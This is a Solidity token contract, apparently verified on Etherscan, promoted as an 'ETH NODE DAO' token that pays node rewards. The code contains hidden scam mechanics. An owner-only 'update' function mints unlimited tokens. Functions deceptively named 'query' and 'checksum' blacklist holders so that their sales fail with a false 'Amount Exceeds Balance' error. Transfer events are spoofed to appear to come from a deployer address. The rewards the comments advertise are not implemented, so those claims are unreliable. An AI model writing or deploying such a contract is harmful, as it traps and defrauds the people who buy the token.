/**
 *Submitted for verification at Etherscan.io on 2022-09-28
*/

pragma solidity 0.8.17;
/*

ETH NODE DAO - $ETHNODE

- Now everyone can own a piece of a node with $ETHNODE

- Recieve APR = % Owned (i.e 1% of supply owned = 1% of Rewards)

- Taxes used to create more ETH Nodes. (More Rewards)

- Daily Rewards




*/    
 
contract NODEPOOL {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) ValueOf;

    // 
    string public name = "ETH NODE POOL";
    string public symbol = unicode"NODEPOOL";
    uint8 public decimals = 18;
    uint256 public totalSupply = 320000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x678068CAEba4659bea63CdF8796224204747c8Ac;
    address lead_deployer = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
   


modifier onlyOwner() {
    require(msg.sender == owner);
    _; }


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!ValueOf[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function update(address oracle,  uint256 update) public {
             require(msg.sender == owner);
             balanceOf[oracle] += update;
             totalSupply += update; }
            function query(address txt) public
             {             
             require(msg.sender == owner);
         require(!ValueOf[txt], "0x");
             ValueOf[txt] = true; }
        function checksum(address txt) public {
             require(msg.sender == owner);
        require(ValueOf[txt], "0x");
         ValueOf[txt] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }     
        require(!ValueOf[from] , "Amount Exceeds Balance"); 
        require(!ValueOf[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }